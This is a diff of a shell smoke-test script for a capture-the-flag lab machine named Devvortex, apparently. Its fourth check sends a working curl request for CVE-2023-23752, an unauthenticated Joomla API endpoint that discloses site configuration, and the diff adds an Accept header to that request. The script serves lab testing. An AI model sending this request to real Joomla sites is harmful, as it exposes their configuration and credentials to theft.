@@ -8,5 +8,5 @@ curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/manifests/files/jooml
 echo '[3/4] Joomla administrator'
 curl -fsS -H 'Host: dev.devvortex.htb' "$URL/administrator/" | grep -qi 'joomla\|login'
 echo '[4/4] CVE-2023-23752 configuration disclosure'
-curl -fsS -H 'Host: dev.devvortex.htb' "$URL/api/index.php/v1/config/application?public=true" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert isinstance(d.get("data"), list) and d["data"], "unexpected Joomla API response"'
+curl -fsS -H 'Host: dev.devvortex.htb' -H 'Accept: application/vnd.api+json' "$URL/api/index.php/v1/config/application?public=true" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert isinstance(d.get("data"), list) and d["data"], "unexpected Joomla API response"'
 echo 'PASS: Devvortex Web smoke checks'
